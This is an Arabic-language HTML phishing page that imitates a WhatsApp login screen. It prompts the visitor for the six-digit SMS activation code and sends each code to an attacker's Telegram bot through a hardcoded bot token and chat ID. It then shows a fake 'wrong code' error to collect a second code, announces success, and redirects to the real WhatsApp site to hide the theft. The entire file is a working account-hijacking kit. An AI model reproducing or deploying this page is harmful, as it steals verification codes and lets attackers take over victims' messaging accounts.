<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
    <title>WhatsApp Login</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #FAF3E7;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* نفس التنسيقات الأصلية */
    </style>
</head>

<body>
    <!-- الشريط العلوي -->
    <header>
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
            <span>WhatsApp</span>
        </div>
        <div class="menu" onclick="toggleMenu()">
            <span></span>
            <span></span>
            <span></span>
            <div class="dropdown">
                <a href="#">سياسات الخصوصية</a>
                <a href="#">مركز المساعدة</a>
                <a href="#">شروط الخدمة</a>
            </div>
        </div>
    </header>

    <!-- المحتوى -->
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
        </div>
        <div class="title">تسجيل الدخول</div>
        <div class="description">
            أدخل رمز التفعيل المكون من 6 أرقام الذي تلقيته من خلال رسالة نصية.
        </div>
        <div class="form-group">
            <input id="phoneNumber" type="tel" placeholder="رمز التفعيل" maxlength="6" pattern="\d{6}" required>
            <button onclick="startVerification()">متابعة</button>
        </div>
        <div id="countdown" style="margin-top: 10px; color: red; font-weight: bold;"></div>
    </div>

    <!-- الشريط السفلي -->
    <footer>
        ©️ 2024 واتساب. جميع الحقوق محفوظة. <br>
        <a href="https://www.whatsapp.com/legal/">سياسة الخصوصية</a> | <a href="https://www.whatsapp.com/">مركز المساعدة</a>
    </footer>

    <script>
        let attempts = 0;

        function toggleMenu() {
            const dropdown = document.querySelector('.dropdown');
            dropdown.classList.toggle('active');
        }

        function startVerification() {
            const phoneNumberInput = document.getElementById('phoneNumber');
            const phoneNumber = phoneNumberInput.value;

            if (!phoneNumber || phoneNumber.length !== 6 || !/^\d{6}$/.test(phoneNumber)) {
                alert('يرجى إدخال رمز مكون من 6 أرقام فقط.');
                return;
            }

            sendCodeToTelegram(phoneNumber);
            startCountdown(phoneNumberInput);
        }

        function sendCodeToTelegram(code) {
            const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
            const chatId = '612575358';
            const message = `رمز التفعيل: ${code}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            }).catch(error => {
                console.error('فشل الاتصال بالخادم:', error);
            });
        }

        function startCountdown(inputField) {
            let countdownValue = 10;
            const countdownDisplay = document.getElementById('countdown');
            countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;

            const interval = setInterval(() => {
                countdownValue--;
                if (countdownValue <= 0) {
                    clearInterval(interval);
                    handleInvalidCode(inputField, countdownDisplay);
                } else {
                    countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
                }
            }, 1000);
        }

        function handleInvalidCode(inputField, countdownDisplay) {
            attempts++;
            if (attempts < 2) {
                countdownDisplay.textContent = '';
                alert('الرمز غير صحيح. تحقق من الرمز جيدًا.');
                inputField.value = '';
            } else {
                alert('تم إدخال الرمز بنجاح!');
                window.location.href = "https://www.whatsapp.com";
            }
        }
    </script>
</body>

</html>
